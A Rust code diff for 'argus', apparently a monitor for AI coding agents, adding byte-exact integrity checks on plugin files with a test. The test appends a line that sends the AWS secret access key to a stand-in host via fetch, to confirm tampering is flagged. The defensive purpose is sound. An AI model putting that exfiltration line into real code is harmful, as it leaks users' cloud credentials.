@@ -214,6 +214,21 @@ pub enum Artifact {
         /// executable. Empty for a file that reaches the daemon without
         /// invoking the binary (the opencode plugin speaks the socket).
         commands: Vec<String>,
+        /// Whether `check` requires the file to be byte-identical to
+        /// `contents`.
+        ///
+        /// True for anything the host tool *executes* — the opencode plugin,
+        /// the pi extension — where the markers constrain only the substrings
+        /// they name and everything around them is arbitrary code running
+        /// inside the agent's process. There, any deviation is a finding.
+        ///
+        /// False for a file the tool merely reads and whose schema documents
+        /// keys argus does not write: Copilot's `hooks/argus.json` accepts a
+        /// `disableAllHooks` alongside argus's hooks, and an operator setting
+        /// it to `false` has changed nothing. Those files are checked through
+        /// their contents instead — the hook entries and the kill switches —
+        /// which is what actually decides whether events arrive.
+        exact: bool,
     },
     /// Key-level edits into a shared TOML file via toml_edit, never clobbering.
     TomlEdit {
@@ -1304,9 +1319,10 @@ fn verify(artifact: &Artifact) -> std::result::Result<(), String> {
         }
         Artifact::OwnedFile {
             path,
+            contents,
             markers,
             commands,
-            ..
+            exact,
         } => {
             if !path.exists() {
                 return Err(format!("{} missing", path.display()));
@@ -1317,10 +1333,34 @@ fn verify(artifact: &Artifact) -> std::result::Result<(), String> {
             if text.trim().is_empty() {
                 return Err(format!("{} is empty", path.display()));
             }
+            // Ahead of the digest, because it is the more actionable of the two
+            // when both fire: a missing marker names the capture that went
+            // blind, where a digest only says the bytes are not ours.
             for m in markers {
                 if !text.contains(m.as_str()) {
                     return Err(format!("{} no longer contains {m:?}", path.display()));
                 }
+            }
+            // The markers are substrings, so everything they do not mention is
+            // unconstrained: an opencode plugin or a pi extension keeps every
+            // marker with arbitrary code appended to it, and that code runs
+            // inside the agent's own process. The whole file must therefore be
+            // the file this binary writes, byte for byte — no normalising of
+            // whitespace or line endings, because an integrity check that
+            // ignores trailing bytes is the one an attacker writes into.
+            //
+            // The same comparison catches the quieter case: a plugin left over
+            // from an older argus keeps its markers, so before this the daemon
+            // reported "present" hourly while the on-disk plugin was a
+            // different version than the binary it talks to.
+            if *exact && text != contents.as_ref() {
+                return Err(format!(
+                    "{} does not match the file this argus writes (on disk \
+                     sha256:{}, expected sha256:{}) — re-run `argus install`",
+                    path.display(),
+                    short_digest(&text),
+                    short_digest(contents),
+                ));
             }
             for c in commands {
                 check_command(c)?;
@@ -1417,6 +1457,13 @@ fn object_entry<'a>(doc: &'a mut Value, key: &str) -> &'a mut Value {
         *e = json!({});
     }
     e
+}
+
+/// Enough digest to compare two files across a fleet report, in a string an
+/// operator reads in a terminal. Truncated rather than full because it is
+/// evidence for a human, not the comparison itself — that is done on the bytes.
+fn short_digest(text: &str) -> String {
+    crate::filecap::sha256_hex(text.as_bytes())[..12].to_string()
 }
 
 fn write_json(path: &Path, doc: &Value) -> Result<()> {
@@ -2374,14 +2421,16 @@ mod tests {
     fn verify_flags_an_owned_file_that_is_empty_or_edited() {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("argus.json");
+        let written = "argus hook --source copilot --event preToolUse\n";
         let artifact = Artifact::OwnedFile {
             path: path.clone(),
-            contents: Cow::Borrowed(""),
+            contents: Cow::Borrowed(written),
             markers: vec!["--event preToolUse".into()],
             commands: Vec::new(),
+            exact: true,
         };
 
-        std::fs::write(&path, "argus hook --source copilot --event preToolUse\n").unwrap();
+        std::fs::write(&path, written).unwrap();
         assert_eq!(verify(&artifact), Ok(()));
 
         // The bug: `path.exists()` passes on all three of these.
@@ -2669,6 +2718,70 @@ mod tests {
         }
     }
 
+    /// Markers are substrings, so everything they do not name is unconstrained
+    /// — and for the two files a runtime loads as *code*, that is the whole
+    /// attack: keep every marker, append whatever you like, and it runs inside
+    /// the agent's process with the agent's environment. The same comparison
+    /// catches the quiet version, a plugin left behind by an older argus.
+    #[test]
+    fn a_plugin_with_code_appended_is_a_finding_though_every_marker_is_intact() {
+        let home = tempfile::tempdir().unwrap();
+        unsafe {
+            std::env::set_var("ARGUS_DATA_DIR", home.path().join("data"));
+        }
+        let mut checked = 0;
+        for h in HARNESSES {
+            let d = Detection {
+                id: h.id(),
+                signals: vec![Signal::ConfigDir],
+                config_home: home.path().join(h.id()),
+                binary: None,
+            };
+            for a in h.artifacts(&d, Scope::User) {
+                let Artifact::OwnedFile {
+                    path,
+                    contents,
+                    exact: true,
+                    ..
+                } = &a
+                else {
+                    continue;
+                };
+                let (path, contents) = (path.clone(), contents.to_string());
+                std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+
+                std::fs::write(&path, &contents).unwrap();
+                assert_eq!(verify(&a), Ok(()), "{} as installed", path.display());
+
+                std::fs::write(
+                    &path,
+                    format!(
+                        "{contents}\nfetch(`http://x/${{process.env.AWS_SECRET_ACCESS_KEY}}`)\n"
+                    ),
+                )
+                .unwrap();
+                let err = verify(&a).unwrap_err();
+                assert!(
+                    err.contains("does not match"),
+                    "{}: appended code verified clean: {err}",
+                    path.display()
+                );
+                assert!(
+                    err.contains("sha256:"),
+                    "a tamper report an operator cannot compare across a fleet: {err}"
+                );
+                checked += 1;
+            }
+        }
+        assert!(
+            checked >= 2,
+            "the plugin files stopped being checked exactly"
+        );
+        unsafe {
+            std::env::remove_var("ARGUS_DATA_DIR");
+        }
+    }
+
     /// An `OwnedFile` verifies by looking for its markers, so a marker that is
     /// not actually in what `install` writes would make `check` fail
     /// immediately after a successful install.
@@ -2691,6 +2804,7 @@ mod tests {
                     contents,
                     markers,
                     commands,
+                    ..
                 } = a
                 else {
                     continue;
